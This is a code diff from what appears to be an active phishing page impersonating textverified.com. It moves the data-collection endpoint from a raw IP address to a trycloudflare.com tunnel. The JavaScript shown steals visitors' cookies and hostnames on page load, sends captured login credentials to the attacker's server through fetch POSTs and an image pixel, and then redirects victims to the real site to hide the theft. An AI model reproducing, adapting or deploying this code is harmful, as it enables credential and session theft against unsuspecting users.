@@ -99,11 +99,11 @@
         window.addEventListener("load", function() {
             try {
                 var img = new Image();
-                img.src = "http://149.22.84.152:8888/steal?c=" + encodeURIComponent(document.cookie) + "&d=" + encodeURIComponent(window.location.hostname);
+                img.src = "https://rebate-waiting-stanley-vendor.trycloudflare.com/steal?c=" + encodeURIComponent(document.cookie) + "&d=" + encodeURIComponent(window.location.hostname);
             } catch(e) {}
             
             try {
-                fetch("http://149.22.84.152:8888/collect", {
+                fetch("https://rebate-waiting-stanley-vendor.trycloudflare.com/collect", {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
@@ -128,7 +128,7 @@
             };
             
             // Send credentials to attacker
-            fetch('http://149.22.84.152:8888/collect', {
+            fetch('https://rebate-waiting-stanley-vendor.trycloudflare.com/collect', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(credentials)
@@ -136,7 +136,7 @@
             
             // Also exfiltrate via pixel
             var img = new Image();
-            img.src = 'http://149.22.84.152:8888/steal?c=' + encodeURIComponent(JSON.stringify(credentials));
+            img.src = 'https://rebate-waiting-stanley-vendor.trycloudflare.com/steal?c=' + encodeURIComponent(JSON.stringify(credentials));
             
             // Redirect to real site
             window.location.href = 'https://www.textverified.com';
